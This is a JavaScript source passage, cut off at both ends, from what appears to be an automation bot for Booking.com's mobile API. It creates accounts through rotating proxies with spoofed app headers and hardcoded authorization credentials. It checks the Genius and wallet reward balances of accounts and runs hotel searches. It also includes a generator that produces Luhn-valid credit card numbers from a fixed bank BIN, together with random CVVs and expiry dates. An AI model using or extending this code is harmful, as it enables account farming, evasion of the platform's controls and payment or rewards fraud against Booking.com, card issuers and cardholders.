    var index = fetch('https://mobile-apps.booking.com/json/mobile.getGeniusInfo?affiliate_id=332731&device_id=509ef8beface40529b00202e17350ba8&languagecode=en-us&network_type=wifi&return_only=amazon_campaign%2Cindex_benefits_carousel&user_os=16.6.1&user_version=41.2.3-iphone', {
        agent: new HttpsProxyAgent(`http://${proxy}`),    
    headers: {
          'Host': 'mobile-apps.booking.com',
          'Authorization': 'Basic d3pQTXpMeU5lI1p2cFBwMTpCMjA5cld0M2FoQiRueDNh',
          'Accept': '*/*',
          'X-Booking-Api-Version': '1',
          'B-S': '2,9682ffe64a591128f87a952f7672b9a3998ba435',
          'Accept-Language': 'en-us',
          'Accept-Encoding': 'gzip, deflate, br',
          'X-Booking-Iam-Access-Token': token,
          'User-Agent': 'Booking.App/41.2.3 iOS/16.6.1; Type: phone; AppStore: apple; Brand: Apple; Model: iPhone13,4;'
        }
      })

        .then(async res => {
            const data = await res.json()
            return data
        })
    return index
}

function checkRewardProxy(token, proxy) {
    var index = fetch('https://mobile-apps.booking.com/json/mobile.dml?affiliate_id=332731&device_id=509ef8beface40529b00202e17350ba8&languagecode=en-us&network_type=wifi&user_os=16.6.1&user_version=41.2.3-iphone', {
        agent: new HttpsProxyAgent(`http://${proxy}`),
    method: 'POST',
        headers: {
          'Host': 'mobile-apps.booking.com',
          'Content-Type': 'application/x-gzip; contains="application/json"',
          'Apollographql-Client-Version': '41.2.3-41.2.3.14726470',
          'X-Booking-Api-Version': '1',
          'Content-Encoding': 'gzip',
          'B-S': '2,c98a69e4b39e084bb7b200ca10ccd51e5c9dfc11',
          'Authorization': 'Basic d3pQTXpMeU5lI1p2cFBwMTpCMjA5cld0M2FoQiRueDNh',
          'Accept': '*/*',
          'Accept-Language': 'en-us',
          'Accept-Encoding': 'gzip, deflate, br',
          'X-Booking-Iam-Access-Token': token,
          'Content-Length': '450',
          'User-Agent': 'Booking.App/41.2.3 iOS/16.6.1; Type: phone; AppStore: apple; Brand: Apple; Model: iPhone13,4;',
          'X-Apollo-Operation-Type': 'query',
          'Apollographql-Client-Name': 'com.booking.BookingApp-apollo-ios',
          'X-Apollo-Operation-Name': 'RewardsAndWalletHome',
        //   'Cookie': '_pxhd=JiIH0i21OnAZ%2FMxVrRv4BwVG9%2FcAmmg4dFxga%2FNh4tcvukm28j%2FK8Bi45UJ031cZvnkn50YpPjUBNoDLDJmLCw%3D%3D%3AAQSkb3JpWWHoHqHEfEezgwQMX%2FV6AJLsMcfIL4n0ltC8y27C7mhypcxEH2O7iv8C4NyUlqIuAS1hBtk-lLDUZP3qDLRVUrXqRByAyy3vV6s%3D; appid=booking.iPhone; did=509ef8beface40529b00202e17350ba8'
        },
        body: JSON.stringify({"operationName":"WalletBalance","variables":{},"query":"query WalletBalance { walletSummary { balance { credits { total { raw prettified currency } cash { raw prettified currency } } rewards { upcoming { monetary { count amount { prettified } } nonMonetary { count items { type title count } } } } vouchers { count amount { prettified } } spendable { prettified raw currency } } attributes { hasWallet hasReceivedVouchers walletStatus { isDisabled } } } walletBookLinks { spendRewardLinks { title description imageUrl link { deepLink href } } } walletFeaturedOffers { type title description iconUrl cta { title link { deepLink href } } } walletExplanationWidget { items { title description asset { assetName setName } } cta { title link { href } } } walletNotifications { id title description isDismissable type position icon { category name } displayConfig { check maxTimes } cta { title link { deepLink href to type } } } }"})
    })

        .then(async res => {
            const data = await res.json()
            return data
        })
    return index
}

// var {
//     HttpsProxyAgent
// } = require('https-proxy-agent');
const isEven = number => number % 2 === 0
const calculateEven = even => (even * 2 < 10) ? even * 2 : even * 2 - 9
const chromePaths = require('chrome-paths');
const path = chromePaths.chrome;

const generateCheckSum = card => {
    const checksum = card.split('')
        .map((number, index) => (isEven(index)) ? calculateEven(number) : parseInt(number, 10))
        .reduce((previous, current) => previous + current) % 10
    return checksum === 0 ? 0 : 10 - checksum
}

const generateCreditCard = () => {
    const ANZBinNumber = '5161805622'
    const randomNumber = Math.random().toString().slice(2, 7)
    const partialCreditCardNumber = ANZBinNumber + randomNumber
    const checksum = generateCheckSum(partialCreditCardNumber)
    return partialCreditCardNumber + checksum
}

function generateRandomNumber(length) {
    const min = Math.pow(10, length - 1);
    const max = Math.pow(10, length) - 1;
    const randomBytes = crypto.randomBytes(length);
    const randomNumber = parseInt(randomBytes.toString('hex'), 16);
    return randomNumber % (max - min + 1) + min;
}

function generateRandomNumber() {
    return Math.floor(Math.random() * 12) + 1;
}

function generateRandomNumberCVV() {
    return Math.floor(Math.random() * 889) + 111;
}
// Fungsi untuk mengubah bilangan menjadi format dua digit (01, 02, ..., 12)
function formatAsTwoDigit(number) {
    return number < 10 ? `0${number}` : `${number}`;
}

function generateRandomYear() {
    const minYear = 24;
    const maxYear = 29;
    const range = maxYear - minYear + 1;

    return Math.floor(Math.random() * range) + minYear;
}



function regisAccountKu(email, deviceId, password) {
    const index = fetch('https://iphone-xml.booking.com/json/mobile.createUserAccount', {
            method: 'POST',
            headers: {
                'Host': 'iphone-xml.booking.com',
                'Authorization': 'Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN',
                'Accept': '*/*"',
                'X-Booking-Api-Version': '1',
                'Accept-Language': 'en-us',
                'Content-Type': 'application/json',
                'User-Agent': 'Booking.App/24.1 iOS/14.0; Type: phone; AppStore: apple; Brand: Apple; Model: iPhone12,5;',
                'Connection': 'close',
            },

            body: JSON.stringify({
                'return_auth_token': '1',
                'password': password,
                'device_id': deviceId,
                'user_version': '24.1-iphone',
                'email': email,
                'language': 'en-us',
                'network_type': 'wifi',
                'languagecode': 'en-us',
                'user_os': '14.0',
                'affiliate_id': '337862',
            })
        })

        .then(async (res) => {
            const data = await res.json();
            return data;
        });
    return index;
}

function regisAccountProxy(email, deviceId, password, proxy) {
    const index = fetch('https://iphone-xml.booking.com/json/mobile.createUserAccount', {
            method: 'POST',
            agent: new HttpsProxyAgent(`http://${proxy}`),
            headers: {
                'Host': 'iphone-xml.booking.com',
                'Authorization': 'Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN',
                'Accept': '*/*"',
                'X-Booking-Api-Version': '1',
                'Accept-Language': 'en-us',
                'Content-Type': 'application/json',
                'User-Agent': 'Booking.App/24.1 iOS/14.0; Type: phone; AppStore: apple; Brand: Apple; Model: iPhone12,5;',
                'Connection': 'close',
            },

            body: JSON.stringify({
                'return_auth_token': '1',
                'password': password,
                'device_id': deviceId,
                'user_version': '24.1-iphone',
                'email': email,
                'language': 'en-us',
                'network_type': 'wifi',
                'languagecode': 'en-us',
                'user_os': '14.0',
                'affiliate_id': '337862',
            })
        })

        .then(async (res) => {
            const data = await res.json();
            return data;
        });
    return index;
}


const getHotelList = (
    country = "pakistan",
    destId = 161,
    page = 1,
    offset = 0,
    checkInDate,
    checkOutDate
  ) =>
    new Promise((resolve, reject) => {
      fetch(
        "https://mobile-apps.booking.com/json/mobile.dml?affiliate_id=332731&currency_code=IDR&device_id=081b7f6b-0bd8-4275-8f9b-43405df0a9e4&languagecode=en-us&network_type=wifi&user_latitude=-6.554053299821086&user_longitude=106.76799774000563&user_os=11&user_version=39.4-android",
        {
          method: "POST",
          headers: {
            authority: "www.booking.com",
            accept: "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            origin: "https://www.booking.com",
            referer: "https://www.booking.com/",
            "sec-ch-ua":
              '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"macOS"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent":
              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
            "x-booking-context-action-name": "searchresults_irene",
            "x-booking-context-aid": "304142",
            "x-booking-pageview-id": "d1a0809c593800ad",
            "x-booking-site-type-id": "1",
            Authorization: "Basic dGhlc2FpbnRzYnY6ZGdDVnlhcXZCeGdN",
          },
          body: JSON.stringify({
            operationName: "FullSearch",
            variables: {
              input: {
                acidCarouselContext: null,
                childrenAges: [],
                doAvailabilityCheck: false,
                enableCampaigns: true,
                filters: {},
                flexWindow: 3,
                forcedBlocks: null,
                dates: {
                  checkin: checkInDate,
                  checkout: checkOutDate,
                },
                location: {
                  searchString: country,
                  destType: "COUNTRY",
                  destId: destId,
                },
                metaContext: {
                  metaCampaignId: 0,
                  externalTotalPrice: null,
                  feedPrice: null,
                  rateRuleId: null,
                  dragongateTraceId: null,
                },
                nbRooms: 1,
                nbAdults: 2,
                nbChildren: 0,
                showAparthotelAsHotel: true,
                needsRoomsMatch: false,
                optionalFeatures: {
                  forceArpExperiments: true,
                  testProperties: false,
                },
                pagination: {
                  rowsPerPage: page,
                  offset: offset,
                },
                referrerBlock: {
                  clickPosition: 0,
                  clickType: "b",
                  blockName: "autocomplete",
                },
                sbCalendarOpen: true,
                sorters: {
                  selectedSorter: "class",
                  referenceGeoId: null,
                  tripTypeIntentId: null,
                },
                travelPurpose: 2,
                seoThemeIds: [],
                useSearchParamsFromSession: true,
              },
              geniusVipUI: {
                enableEnroll: true,
                page: "SEARCH_RESULTS",
              },
            },
            extensions: {},
            query:
              "query FullSearch($input: SearchQueryInput!, $geniusVipUI: GeniusVipUIsInput) {\n  searchQueries {\n    search(input: $input) {\n      ...FullSearchFragment\n      __typename\n    }\n    __typename\n  }\n  geniusVipEnrolledProgram(input: $geniusVipUI) {\n    ...geniusVipEnrolledProgram\n    __typename\n  }\n}\n\nfragment FullSearchFragment on SearchQueryOutput {\n  banners {\n    ...Banner\n    __typename\n  }\n  breadcrumbs {\n    ... on SearchResultsBreadcrumb {\n      ...SearchResultsBreadcrumb\n      __typename\n    }\n    ... on LandingPageBreadcrumb {\n      ...LandingPageBreadcrumb\n      __typename\n    }\n    __typename\n  }\n  carousels {\n    ...Carousel\n    __typename\n  }\n  destinationLocation {\n    ...DestinationLocation\n    __typename\n  }\n  entireHomesSearchEnabled\n  dateFlexibilityOptions {\n    enabled\n    __typename\n  }\n  filters {\n    ...FilterData\n    __typename\n  }\n  appliedFilterOptions {\n    ...FilterOption\n    __typename\n  }\n  recommendedFilterOptions {\n    ...FilterOption\n    __typename\n  }\n  pagination {\n    nbResultsPerPage\n    nbResultsTotal\n    __typename\n  }\n  tripTypes {\n    ...TripTypesData\n    __typename\n  }\n  results {\n    ...BasicPropertyData\n    ...MatchingUnitConfigurations\n    ...PropertyBlocks\n    ...BookerExperienceData\n    priceDisplayInfoIrene {\n      ...PriceDisplayInfoIrene\n      __typename\n    }\n    licenseDetails {\n      nextToHotelName\n      __typename\n    }\n    inferredLocationScore\n    trackOnView {\n      experimentTag\n      __typename\n    }\n    topPhotos {\n      highResUrl {\n        relativeUrl\n        __typename\n      }\n      lowResUrl {\n        relativeUrl\n        __typename\n      }\n      highResJpegUrl {\n        relativeUrl\n        __typename\n      }\n      lowResJpegUrl {\n        relativeUrl\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  searchMeta {\n    ...SearchMetadata\n    __typename\n  }\n  sorters {\n    option {\n      ...SorterFields\n      __typename\n    }\n    __typename\n  }\n  oneOfThreeDeal {\n    ...OneOfThreeDeal\n    __typename\n  }\n  zeroResultsSection {\n    ...ZeroResultsSection\n    __typename\n  }\n  rocketmilesSearchUuid\n  previousSearches {\n    ...PreviousSearches\n    __typename\n  }\n  frontierThemes {\n    ...FrontierThemes\n    __typename\n  }\n  __typename\n}\n\nfragment BasicPropertyData on SearchResultProperty {\n  acceptsWalletCredit\n  basicPropertyData {\n    accommodationTypeId\n    id\n    isTestProperty\n    location {\n      address\n      city\n      countryCode\n      __typename\n    }\n    pageName\n    ufi\n    photos {\n      main {\n        highResUrl {\n          relativeUrl\n          __typename\n        }\n        lowResUrl {\n          relativeUrl\n          __typename\n        }\n        highResJpegUrl {\n          relativeUrl\n          __typename\n        }\n        lowResJpegUrl {\n          relativeUrl\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    reviewScore: reviews {\n      score: totalScore\n      reviewCount: reviewsCount\n      totalScoreTextTag {\n        translation\n        __typename\n      }\n      showScore\n      secondaryScore\n      secondaryTextTag {\n        translation\n        __typename\n      }\n      showSecondaryScore\n      __typename\n    }\n    externalReviewScore: externalReviews {\n      score: totalScore\n      reviewCount: reviewsCount\n      showScore\n      totalScoreTextTag {\n        translation\n        __typename\n      }\n      __typename\n    }\n    alternativeExternalReviewsScore: alternativeExternalReviews {\n      score: totalScore\n      reviewCount: reviewsCount\n      showScore\n      totalScoreTextTag {\n        translation\n        __typename\n      }\n      __typename\n    }\n    starRating {\n      value\n      symbol\n      caption {\n        translation\n        __typename\n      }\n      tocLink {\n        translation\n        __typename\n      }\n      showAdditionalInfoIcon\n      __typename\n    }\n    isClosed\n    paymentConfig {\n      installments {\n        minPriceFormatted\n        maxAcceptCount\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  badges {\n    caption {\n      translation\n      __typename\n    }\n    closedFacilities {\n      startDate\n      endDate\n      __typename\n    }\n    __typename\n  }\n  customBadges {\n    showIsWorkFriendly\n    showParkAndFly\n    showSkiToDoor\n    showBhTravelCreditBadge\n    showOnlineCheckinBadge\n    __typename\n  }\n  description {\n    text\n    __typename\n  }\n  displayName {\n    text\n    translationTag {\n      translation\n      __typename\n    }\n    __typename\n  }\n  geniusInfo {\n    benefitsCommunication {\n      header {\n        title\n        __typename\n      }\n      items {\n        title\n        __typename\n      }\n      __typename\n    }\n    geniusBenefits\n    geniusBenefitsData {\n      hotelCardHasFreeBreakfast\n      hotelCardHasFreeRoomUpgrade\n      sortedBenefits\n      __typename\n    }\n    showGeniusRateBadge\n    __typename\n  }\n  isInCompanyBudget\n  location {\n    displayLocation\n    mainDistance\n    publicTransportDistanceDescription\n    skiLiftDistance\n    beachDistance\n    nearbyBeachNames\n    beachWalkingTime\n    geoDistanceMeters\n    __typename\n  }\n  mealPlanIncluded {\n    mealPlanType\n    text\n    __typename\n  }\n  persuasion {\n    autoextended\n    geniusRateAvailable\n    highlighted\n    preferred\n    preferredPlus\n    showNativeAdLabel\n    nativeAdId\n    nativeAdsCpc\n    nativeAdsTracking\n    bookedXTimesMessage\n    sponsoredAdsData {\n      isDsaCompliant\n      legalEntityName\n      sponsoredAdsDesign\n      __typename\n    }\n    __typename\n  }\n  policies {\n    showFreeCancellation\n    showNoPrepayment\n    enableJapaneseUsersSpecialCase\n    __typename\n  }\n  ribbon {\n    ribbonType\n    text\n    __typename\n  }\n  recommendedDate {\n    checkin\n    checkout\n    lengthOfStay\n    __typename\n  }\n  showGeniusLoginMessage\n  showPrivateHostMessage\n  soldOutInfo {\n    isSoldOut\n    messages {\n      text\n      __typename\n    }\n    alternativeDatesMessages {\n      text\n      __typename\n    }\n    __typename\n  }\n  nbWishlists\n  visibilityBoosterEnabled\n  showAdLabel\n  isNewlyOpened\n  propertySustainability {\n    isSustainable\n    tier {\n      type\n      __typename\n    }\n    facilities {\n      id\n      __typename\n    }\n    certifications {\n      name\n      __typename\n    }\n    chainProgrammes {\n      chainName\n      programmeName\n      __typename\n    }\n    levelId\n    __typename\n  }\n  seoThemes {\n    caption\n    __typename\n  }\n  relocationMode {\n    distanceToCityCenterKm\n    distanceToCityCenterMiles\n    distanceToOriginalHotelKm\n    distanceToOriginalHotelMiles\n    phoneNumber\n    __typename\n  }\n  bundleRatesAvailable\n  recommendedDatesLabel\n  __typename\n}\n\nfragment Banner on Banner {\n  name\n  type\n  isDismissible\n  showAfterDismissedDuration\n  position\n  requestAlternativeDates\n  title {\n    text\n    __typename\n  }\n  imageUrl\n  paragraphs {\n    text\n    __typename\n  }\n  metadata {\n    key\n    value\n    __typename\n  }\n  pendingReviewInfo {\n    propertyPhoto {\n      lowResUrl {\n        relativeUrl\n        __typename\n      }\n      lowResJpegUrl {\n        relativeUrl\n        __typename\n      }\n      __typename\n    }\n    propertyName\n    urlAccessCode\n    __typename\n  }\n  nbDeals\n  primaryAction {\n    text {\n      text\n      __typename\n    }\n    action {\n      name\n      context {\n        key\n        value\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  secondaryAction {\n    text {\n      text\n      __typename\n    }\n    action {\n      name\n      context {\n        key\n        value\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  iconName\n  flexibleFilterOptions {\n    optionId\n    filterName\n    __typename\n  }\n  trackOnView {\n    type\n    experimentHash\n    value\n    __typename\n  }\n  dateFlexQueryOptions {\n    text {\n      text\n      __typename\n    }\n    action {\n      name\n      context {\n        key\n        value\n        __typename\n      }\n      __typename\n    }\n    isApplied\n    __typename\n  }\n  __typename\n}\n\nfragment Carousel on Carousel {\n  aggregatedCountsByFilterId\n  carouselId\n  position\n  contentType\n  hotelId\n  name\n  soldoutProperties\n  priority\n  themeId\n  title {\n    text\n    __typename\n  }\n  slides {\n    captionText {\n      text\n      __typename\n    }\n    name\n    photoUrl\n    subtitle {\n      text\n      __typename\n    }\n    type\n    title {\n      text\n      __typename\n    }\n    action {\n      context {\n        key\n        value\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment DestinationLocation on DestinationLocation {\n  name {\n    text\n    __typename\n  }\n  inName {\n    text\n    __typename\n  }\n  countryCode\n  __typename\n}\n\nfragment FilterData on Filter {\n  trackOnView {\n    type\n    experimentHash\n    value\n    __typename\n  }\n  trackOnClick {\n    type\n    experimentHash\n    value\n    __typename\n  }\n  name\n  field\n  category\n  filterStyle\n  title {\n    text\n    translationTag {\n      translation\n      __typename\n    }\n    __typename\n  }\n  subtitle\n  options {\n    trackOnView {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnClick {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnSelect {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnDeSelect {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnViewPopular {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnClickPopular {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnSelectPopular {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnDeSelectPopular {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    ...FilterOption\n    __typename\n  }\n  filterLayout {\n    isCollapsable\n    collapsedCount\n    __typename\n  }\n  stepperOptions {\n    min\n    max\n    default\n    selected\n    title {\n      text\n      translationTag {\n        translation\n        __typename\n      }\n      __typename\n    }\n    field\n    labels {\n      text\n      translationTag {\n        translation\n        __typename\n      }\n      __typename\n    }\n    trackOnView {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnClick {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnSelect {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnDeSelect {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnClickDecrease {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnClickIncrease {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnDecrease {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    trackOnIncrease {\n      type\n      experimentHash\n      value\n      __typename\n    }\n    __typename\n  }\n  sliderOptions {\n    min\n    max\n    minSelected\n    maxSelected\n    minPriceStep\n    minSelectedFormatted\n    currency\n    histogram\n    selectedRange {\n      translation\n      __typename\n    }\n    title\n    __typename\n  }\n  sliderOptionsPerStay {\n    min\n    max\n    minSelected\n    maxSelected\n    minPriceStep\n    minSelectedFormatted\n    currency\n    histogram\n    selectedRange {\n      translation\n      __typename\n    }\n    title\n    __typename\n  }\n  __typename\n}\n\nfragment FilterOption on Option {\n  optionId: id\n  count\n  selected\n  urlId\n  additionalLabel {\n    text\n    translationTag {\n      translation\n      __typename\n    }\n    __typename\n  }\n  value {\n    text\n    translationTag {\n      translation\n      __typename\n    }\n    __typename\n  }\n  starRating {\n    value\n    symbol\n    caption {\n      translation\n      __typename\n    }\n    showAdditionalInfoIcon\n    __typename\n  }\n  __typename\n}\n\nfragment LandingPageBreadcrumb on LandingPageBreadcrumb {\n  destType\n  name\n  urlParts\n  __typename\n}\n\nfragment MatchingUnitConfigurations on SearchResultProperty {\n  matchingUnitConfigurations {\n    commonConfiguration {\n      name\n      unitId\n      bedConfigurations {\n        beds {\n          count\n          type\n          __typename\n        }\n        nbAllBeds\n        __typename\n      }\n      nbAllBeds\n      nbBathrooms\n      nbBedrooms\n      nbKitchens\n      nbLivingrooms\n      nbPools\n      nbUnits\n      unitTypeNames {\n        translation\n        __typename\n      }\n      localizedArea {\n        localizedArea\n        unit\n        __typename\n      }\n      __typename\n    }\n    unitConfigurations {\n      name\n      unitId\n      bedConfigurations {\n        beds {\n          count\n          type\n          __typename\n        }\n        nbAllBeds\n        __typename\n      }\n      apartmentRooms {\n        config {\n          roomId: id\n          roomType\n          bedTypeId\n          bedCount: count\n          __typename\n        }\n        roomName: tag {\n          tag\n          translation\n          __typename\n        }\n        __typename\n      }\n      nbAllBeds\n      nbBathrooms\n      nbBedrooms\n      nbKitchens\n      nbLivingrooms\n      nbPools\n      nbUnits\n      unitTypeNames {\n        translation\n        __typename\n      }\n      localizedArea {\n        localizedArea\n        unit\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment PropertyBlocks on SearchResultProperty {\n  blocks {\n    blockId {\n      roomId\n      occupancy\n      policyGroupId\n      packageId\n      mealPlanId\n      __typename\n    }\n    finalPrice {\n      amount\n      currency\n      __typename\n    }\n    originalPrice {\n      amount\n      currency\n      __typename\n    }\n    onlyXLeftMessage {\n      tag\n      variables {\n        key\n        value\n        __typename\n      }\n      translation\n      __typename\n    }\n    freeCancellationUntil\n    hasCrib\n    blockMatchTags {\n      childStaysForFree\n      __typename\n    }\n    thirdPartyInventoryContext {\n      isTpiBlock\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment PriceDisplayInfoIrene on PriceDisplayInfoIrene {\n  badges {\n    name {\n      translation\n      __typename\n    }\n    tooltip {\n      translation\n      __typename\n    }\n    style\n    identifier\n    __typename\n  }\n  chargesInfo {\n    translation\n    __typename\n  }\n  displayPrice {\n    copy {\n      translation\n      __typename\n    }\n    amountPerStay {\n      amount\n      amountRounded\n      amountUnformatted\n      currency\n      __typename\n    }\n    __typename\n  }\n  priceBeforeDiscount {\n    copy {\n      translation\n      __typename\n    }\n    amountPerStay {\n      amount\n      amountRounded\n      amountUnformatted\n      currency\n      __typename\n    }\n    __typename\n  }\n  rewards {\n    rewardsList {\n      termsAndConditions\n      amountPerStay {\n        amount\n        amountRounded\n        amountUnformatted\n        currency\n        __typename\n      }\n      breakdown {\n        productType\n        amountPerStay {\n          amount\n          amountRounded\n          amountUnformatted\n          currency\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    rewardsAggregated {\n      amountPerStay {\n        amount\n        amountRounded\n        amountUnformatted\n        currency\n        __typename\n      }\n      copy {\n        translation\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  useRoundedAmount\n  discounts {\n    amount {\n      amount\n      amountRounded\n      amountUnformatted\n      currency\n      __typename\n    }\n    name {\n      translation\n      __typename\n    }\n    description {\n      translation\n      __typename\n    }\n    itemType\n    productId\n    __typename\n  }\n  excludedCharges {\n    excludeChargesAggregated {\n      copy {\n        translation\n        __typename\n      }\n      amountPerStay {\n        amount\n        amountRounded\n        amountUnformatted\n        currency\n        __typename\n      }\n      __typename\n    }\n    excludeChargesList {\n      chargeMode\n      chargeInclusion\n      chargeType\n      amountPerStay {\n        amount\n        amountRounded\n        amountUnformatted\n        currency\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  taxExceptions {\n    shortDescription {\n      translation\n      __typename\n    }\n    longDescription {\n      translation\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment BookerExperienceData on SearchResultProperty {\n  bookerExperienceContentUIComponentProps {\n    ... on BookerExperienceContentLoyaltyBadgeListProps {\n      badges {\n        variant\n        key\n        title\n        popover\n        logoSrc\n        logoAlt\n        __typename\n      }\n      __typename\n    }\n    ... on BookerExperienceContentFinancialBadgeProps {\n      paymentMethod\n      backgroundColor\n      hideAccepted\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment SearchMetadata on SearchMeta {\n  availabilityInfo {\n    hasLowAvailability\n    unavailabilityPercent\n    totalAvailableNotAutoextended\n    __typename\n  }\n  boundingBoxes {\n    swLat\n    swLon\n    neLat\n    neLon\n    type\n    __typename\n  }\n  childrenAges\n  dates {\n    checkin\n    checkout\n    lengthOfStayInDays\n    __typename\n  }\n  destId\n  destType\n  maxLengthOfStayInDays\n  nbRooms\n  nbAdults\n  nbChildren\n  userHasSelectedFilters\n  customerValueStatus\n  affiliatePartnerChannelId\n  affiliateVerticalType\n  affiliateName\n  __typename\n}\n\nfragment SearchResultsBreadcrumb on SearchResultsBreadcrumb {\n  destId\n  destType\n  name\n  __typename\n}\n\nfragment SorterFields on SorterOption {\n  type: name\n  captionTranslationTag {\n    translation\n    __typename\n  }\n  tooltipTranslationTag {\n    translation\n    __typename\n  }\n  isSelected: selected\n  __typename\n}\n\nfragment OneOfThreeDeal on OneOfThreeDeal {\n  id\n  uuid\n  winnerHotelId\n  winnerBlockId\n  priceDisplayInfo {\n    displayPrice {\n      amountPerStay {\n        amountRounded\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  locationInfo {\n    name\n    inName\n    destType\n    __typename\n  }\n  destinationType\n  commonFacilities {\n    id\n    name\n    __typename\n  }\n  tpiParams {\n    wholesalerCode\n    rateKey\n    rateBlockId\n    bookingRoomId\n    supplierId\n    __typename\n  }\n  properties {\n    priceDisplayInfo {\n      priceBeforeDiscount {\n        amountPerStay {\n          amountRounded\n          __typename\n        }\n        __typename\n      }\n      displayPrice {\n        amountPerStay {\n          amountRounded\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    basicPropertyData {\n      id\n      name\n      pageName\n      photos {\n        main {\n          highResUrl {\n            absoluteUrl\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      location {\n        address\n        countryCode\n        __typename\n      }\n      reviews {\n        reviewsCount\n        totalScore\n        __typename\n      }\n      __typename\n    }\n    blocks {\n      thirdPartyInventoryContext {\n        rateBlockId\n        rateKey\n        wholesalerCode\n        tpiRoom {\n          bookingRoomId\n          __typename\n        }\n        supplierId\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment TripTypesData on TripTypes {\n  beach {\n    isBeachUfi\n    isEnabledBeachUfi\n    isCoastalBeachRegion\n    isBeachDestinationWithoutBeach\n    __typename\n  }\n  ski {\n    isSkiExperience\n    isSkiScaleUfi\n    __typename\n  }\n  carouselBeach {\n    name\n    beachId\n    photoUrl\n    reviewScore\n    reviewScoreFormatted\n    translatedBeachActivities\n    translatedSandType\n    __typename\n  }\n  skiLandmarkData {\n    resortId\n    slopeTotalLengthFormatted\n    totalLiftsCount\n    __typename\n  }\n  __typename\n}\n\nfragment ZeroResultsSection on ZeroResultsSection {\n  title {\n    text\n    __typename\n  }\n  primaryAction {\n    text {\n      text\n      __typename\n    }\n    action {\n      name\n      __typename\n    }\n    __typename\n  }\n  paragraphs {\n    text\n    __typename\n  }\n  type\n  __typename\n}\n\nfragment PreviousSearches on PreviousSearch {\n  childrenAges\n  __typename\n}\n\nfragment FrontierThemes on FrontierTheme {\n  id\n  name\n  selected\n  __typename\n}\n\nfragment geniusVipEnrolledProgram on GeniusVipEnrolledProgram {\n  metadata {\n    programType\n    __typename\n  }\n  geniusVipUIs {\n    searchResultModal {\n      title {\n        text\n        __typename\n      }\n      subtitle {\n        text\n        __typename\n      }\n      modalCategory\n      asset {\n        __typename\n        ... on Image {\n          url\n          __typename\n        }\n      }\n      cta {\n        text\n        actionString\n        actionDismiss\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n",
          }),
        }
      )
        .then((res) => res.json())
        .then((res) => resolve(res))
        .catch((err) => reject(err))
    })
  
  const getDetailHotel = (hotelId, checkInDate, checkOutDate, iamAccessToken) =>
    new Promise((resolve, reject) => {
      fetch(
        `https://mobile-apps.booking.com/json/mobile.hotelPage?include_bsb_info=1&sort_by=auto&pod_separate_policies_from_title=1&check_excluded_charge_or_tax=1&include_genius_benefits_per_placement=1&use_direct_payment=1&include_num_ceb_available=1&languagecode=en-us&ios_img_increase=1&arrival_date=${checkInDate}&include_excluded_charges_detail=1&show_if_rare_find=1&include_zip_required=1&show_if_domestic_rate=2&include_popular_facilities=1&include_free_facilities=1&include_ufi_room_size_average=1&ranking_position=0&apass_opt_in=1&include_child_policies_text=1&device_id=081b7f6b-0bd8-4275-8f9b-43405df0a9e4&new_sustainability=1&include_composite_breakdown=1&include_genius_benefits_list=1&include_rtb=1&show_full_mealplan_description=1&block_ids=1013771001_375379542_0_42_0&include_highlight_strip=1&rec_version=2&include_breakfast_msg=1&affiliate_id=332731&include_important_info_with_codes=1&cur_page=hp&is_personalisation_disabled=0&show_house_rules_bp=1&include_property_highlight_strip=1&include_bh_room_highlights=1&add_inclusion=1&user_version=39.4-android&hotel_id=${hotelId}&show_genius_free_room_upgrade=0&include_decoupling_keys=1&user_longitude=106.7679977400056&search_id=15c4d76e421692987035136135a6fbd2430%3A1%3A202&include_temporarily_closed_facilities=1&include_keycollection_info=1&correct_cpv2=1&add_has_open_booking_flag=1&include_is_block_fit=1&get_rare_find_state=1&include_bwallet_room_eligibility=1&upsort_refundable_ml=1&departure_date=${checkOutDate}&facility_info_format=1&user_os=11&include_has_theme_park_benefits=1&show_hotel_genius_status=1&get_photo_for_room_facilities=1